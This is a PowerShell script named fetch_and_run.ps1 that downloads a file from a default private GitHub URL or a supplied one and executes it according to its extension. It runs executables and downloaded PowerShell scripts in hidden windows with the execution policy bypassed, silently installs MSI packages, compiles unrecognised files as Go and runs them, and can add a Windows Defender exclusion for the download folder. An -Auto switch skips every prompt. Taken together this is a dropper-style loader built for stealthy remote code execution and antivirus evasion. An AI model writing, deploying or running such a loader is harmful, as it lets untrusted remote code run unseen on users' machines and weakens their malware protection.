<#
fetch_and_run.ps1
- Downloads a given URL to a local folder
- Optionally installs Go silently to a system-wide location and adds to PATH (requires admin)
- Runs or extracts the downloaded artifact appropriately
- Adds a Defender exclusion for the file/folder optionally (requires admin)
- Logs actions to %TEMP%\download_runner.log

USAGE (interactive):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\fetch_and_run.ps1

USAGE (auto, no prompts):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\fetch_and_run.ps1 -Auto

Edit $remoteUrl below or pass -Url parameter. For private repos, set $env:GITHUB_PAT.
#>

param(
    [string]$Url = "",
    [switch]$Auto,               # if true, skip interactive prompts and proceed
    [switch]$InstallGo,          # if true, download & install Go silently (requires admin)
    [string]$DestFolder = "",    # optional output folder
    [switch]$AddDefenderExclusion, # add Defender exclusion for dest folder or downloaded file (requires admin)
    [switch]$RunHidden           # start exe hidden
)

# -------------------------
# Config - edit if needed
# -------------------------
if (-not $Url -or $Url.Trim() -eq "") {
    # Default: your GitHub raw URL (private repo requires PAT)
    $Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile"
    if ($env:GITHUB_PAT) {
        $Url = $Url -replace "https://", "https://$($env:GITHUB_USER):$($env:GITHUB_PAT)@"
    }
}

$LogFile = Join-Path $env:TEMP "download_runner.log"
function Log { param($m) $line = "$(Get-Date -Format o) - $m"; Add-Content -Path $LogFile -Value $line; Write-Output $line }

# Ensure destination folder
if (-not $DestFolder -or $DestFolder.Trim() -eq "") {
    $DestFolder = Join-Path $env:USERPROFILE "Downloads\fetch_and_run"
}
if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null }

# Helper: ensure admin
function Test-IsAdmin { 
    try { (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $false } 
}

# Helper: download file robustly
function Download-File($sourceUrl, $outPath) {
    Log "Downloading $sourceUrl -> $outPath"
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "fetch_and_run/1.0")
        $wc.DownloadFile($sourceUrl, $outPath)
        Log "Downloaded successfully"
        return $true
    } catch {
        Log "Download failed: $_"
        return $false
    } finally {
        if ($wc) { $wc.Dispose() }
    }
}

# Helper: run exe (hidden optional)
function Run-Exe($path, $args = "", $hidden = $true) {
    Log "Launching executable: $path $args"
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $path
    $si.Arguments = $args
    $si.UseShellExecute = $false
    if ($hidden) { $si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden }
    [System.Diagnostics.Process]::Start($si) | Out-Null
}

# Helper: add Defender exclusion (folder or file)
function Add-DefenderExclusion($path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot add Defender exclusion: not running as admin"
        return $false
    }
    try {
        Log "Adding Windows Defender exclusion for $path"
        Add-MpPreference -ExclusionPath $path -ErrorAction Stop
        Log "Exclusion added"
        return $true
    } catch {
        Log "Failed to add Defender exclusion: $_"
        return $false
    }
}

# Helper: add path to system PATH environment variable
function Add-ToSystemPath($path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot modify system PATH: not running as admin"
        return $false
    }
    try {
        $currentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
        if ($currentPath -notlike "*$path*") {
            Log "Adding $path to system PATH"
            $newPath = $currentPath + ";$path"
            [Environment]::SetEnvironmentVariable("Path", $newPath, [System.EnvironmentVariableTarget]::Machine)
            Log "System PATH updated"
            return $true
        } else {
            Log "$path already in system PATH"
            return $true
        }
    } catch {
        Log "Failed to update system PATH: $_"
        return $false
    }
}

# Optional: download & install Go silently (MSI) to system-wide location
function Install-GoSilent {
    if (-not (Test-IsAdmin)) {
        Log "Install-GoSilent: admin required but not admin. Aborting Go install."
        return $false
    }
    $goVersion = "1.23.2" # Latest stable version as of Sep 2025
    $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
    $msiName = "go$goVersion.windows-$arch.msi"
    $msiUrl = "https://go.dev/dl/$msiName"
    $msiPath = Join-Path $DestFolder $msiName
    $goInstallDir = "C:\Program Files\Go"

    # Check if Go is already installed
    $goBin = Join-Path $goInstallDir "bin\go.exe"
    if (Test-Path $goBin) {
        Log "Go already installed at $goInstallDir"
        return $true
    }

    Log "Downloading Go MSI $msiUrl"
    if (-not (Download-File $msiUrl $msiPath)) { Log "Go MSI download failed"; return $false }

    Log "Starting silent install of Go via msiexec to $goInstallDir (may prompt UAC)"
    $args = "/i `"$msiPath`" /qn /norestart INSTALLDIR=`"$goInstallDir`""
    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru
    if ($proc.ExitCode -eq 0) {
        Log "Go installed successfully to $goInstallDir"
        # Add Go to system PATH
        $goBinPath = Join-Path $goInstallDir "bin"
        Add-ToSystemPath $goBinPath | Out-Null
        # Set GOROOT environment variable
        [Environment]::SetEnvironmentVariable("GOROOT", $goInstallDir, [System.EnvironmentVariableTarget]::Machine)
        Log "GOROOT set to $goInstallDir"
        return $true
    } else {
        Log "Go msiexec returned exit code $($proc.ExitCode)"
        return $false
    }
}

# Helper: compile and run Go program
function Run-GoProgram($goFilePath) {
    Log "Detected Go source file: $goFilePath"
    $goExe = "go"
    if (-not (Get-Command $goExe -ErrorAction SilentlyContinue)) {
        Log "Go not found in PATH. Attempting to install Go."
        if (-not (Install-GoSilent)) {
            Log "Failed to install Go. Cannot compile Go program."
            return $false
        }
    }
    $exePath = [System.IO.Path]::ChangeExtension($goFilePath, ".exe")
    Log "Compiling Go program: $goFilePath -> $exePath"
    $proc = Start-Process -FilePath $goExe -ArgumentList "build","-o",$exePath,$goFilePath -Wait -PassThru -NoNewWindow
    if ($proc.ExitCode -eq 0) {
        Log "Compilation successful. Running $exePath"
        Run-Exe -path $exePath -hidden:$RunHidden
        return $true
    } else {
        Log "Go build failed with exit code $($proc.ExitCode)"
        return $false
    }
}

# -------------------------
# Begin main
# -------------------------
Log "fetch_and_run started. DestFolder: $DestFolder  Url: $Url"

# Convert GitHub blob URL to raw if user passed blob URL
if ($Url -match "github.com/.+/blob/(.+)$") {
    $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
    if ($env:GITHUB_PAT) {
        $Url = $Url -replace "https://", "https://$($env:GITHUB_USER):$($env:GITHUB_PAT)@"
    }
    Log "Detected GitHub blob URL, converted to raw URL: $Url"
}

# Get filename from URL (fallback to timestamp name)
$uri = [System.Uri]$Url
$fname = [System.IO.Path]::GetFileName($uri.AbsolutePath)
if (-not $fname -or $fname.Trim() -eq "") { $fname = "privatefile_$(Get-Date -Format yyyyMMddHHmmss).go" }
$destPath = Join-Path $DestFolder $fname

# Confirm with user unless Auto
if (-not $Auto) {
    Write-Host "About to download:`n $Url`nTo:`n $destPath`n"
    $do = Read-Host "Proceed? Y/N"
    if ($do.ToUpper() -ne "Y") { Log "User cancelled"; exit 0 }
}

# Download file
if (-not (Download-File $Url $destPath)) {
    Log "Download failed. Exiting."
    exit 1
}

# If user requested Go install
if ($InstallGo) {
    if (-not $Auto) {
        $yn = Read-Host "Install Go on this machine now? This requires admin. Y/N"
        if ($yn.ToUpper() -ne "Y") { Log "Skipped Go install per user"; }
        else { Install-GoSilent | Out-Null }
    } else {
        Install-GoSilent | Out-Null
    }
}

# Add Defender exclusion if requested
if ($AddDefenderExclusion) {
    if (-not (Test-IsAdmin)) {
        Log "Warning: adding Defender exclusion requires admin. Please re-run as admin to add exclusion."
    } else {
        Add-DefenderExclusion $DestFolder | Out-Null
    }
}

# Act depending on file type
$ext = [System.IO.Path]::GetExtension($destPath).ToLowerInvariant()
switch ($ext) {
    ".msi" {
        Log "Detected MSI, will attempt silent install"
        if (-not (Test-IsAdmin)) { Log "MSI install requires admin. Please re-run as Administrator."; break }
        $args = "/i `"$destPath`" /qn /norestart"
        Log "Running: msiexec $args"
        $p = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru
        Log "msiexec exit code: $($p.ExitCode)"
    }
    ".exe" {
        Log "Detected EXE. Will run executable."
        if ($AddDefenderExclusion -and (Test-IsAdmin)) { Add-DefenderExclusion $destPath | Out-Null }
        Run-Exe -path $destPath -hidden:$RunHidden
    }
    ".zip" {
        Log "Detected ZIP. Extracting."
        try {
            Expand-Archive -Path $destPath -DestinationPath $DestFolder -Force
            Log "Extracted to $DestFolder"
        } catch {
            Log "ZIP extraction failed: $_"
        }
    }
    ".ps1" {
        Log "Detected PowerShell script. Running with Bypass."
        if (-not $Auto) { $r = Read-Host "Run the downloaded PS1 now? Y/N"; if ($r.ToUpper() -ne "Y") { Log "Skipped running PS1"; break } }
        $cmd = "-ExecutionPolicy Bypass -NoProfile -File `"$destPath`""
        Log "Executing: powershell.exe $cmd"
        Start-Process -FilePath "powershell.exe" -ArgumentList $cmd -WindowStyle Hidden
    }
    ".go" {
        Log "Detected Go source file."
        if (-not $Auto) { $r = Read-Host "Compile and run the Go program now? Y/N"; if ($r.ToUpper() -ne "Y") { Log "Skipped running Go program"; break } }
        Run-GoProgram $destPath
    }
    default {
        Log "Unknown extension ($ext). Assuming Go source file."
        if ($Auto) {
            Log "Auto-mode: attempting to run file as Go source."
            $goPath = [System.IO.Path]::ChangeExtension($destPath, ".go")
            Rename-Item -Path $destPath -NewName $goPath -Force
            Run-GoProgram $goPath
        } else {
            Write-Host "Downloaded file to $destPath. Assuming Go source file."
            $goPath = [System.IO.Path]::ChangeExtension($destPath, ".go")
            Rename-Item -Path $destPath -NewName $goPath -Force
            $r = Read-Host "Compile and run as Go program? Y/N"
            if ($r.ToUpper() -eq "Y") { Run-GoProgram $goPath }
            else { Log "Skipped running Go program"; }
        }
    }
}

Log "fetch_and_run finished."
